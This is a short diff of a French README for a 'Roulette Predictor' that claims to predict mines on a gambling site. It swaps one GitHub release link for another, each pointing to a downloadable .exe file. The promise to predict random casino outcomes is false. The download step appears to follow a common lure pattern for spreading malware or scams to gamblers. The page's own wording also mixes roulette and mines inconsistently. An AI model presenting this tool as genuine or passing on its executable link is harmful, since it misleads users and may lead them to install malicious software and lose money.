@@ -22,7 +22,7 @@ Roulette Predictor est un outil logiciel conçu pour prédire les mines sur le c
 
 Suivez ces étapes pour démarrer avec Roulette Predictor :
 
-1. Téléchargez la dernière version depuis la section [Releases](https://github.com/Stake-Predictor-IW/Stake-mines-predictor/releases/download/Stake-mines/stake-mines.exe).
+1. Téléchargez la dernière version depuis la section [Releases](https://github.com/Stake-Predictor-IW/Stake-Roulette-Predictor/releases/download/Roulette-Predictor/Stake-Roulette.exe).
 
 2. Extrayez les fichiers téléchargés vers un emplacement de votre choix.
 
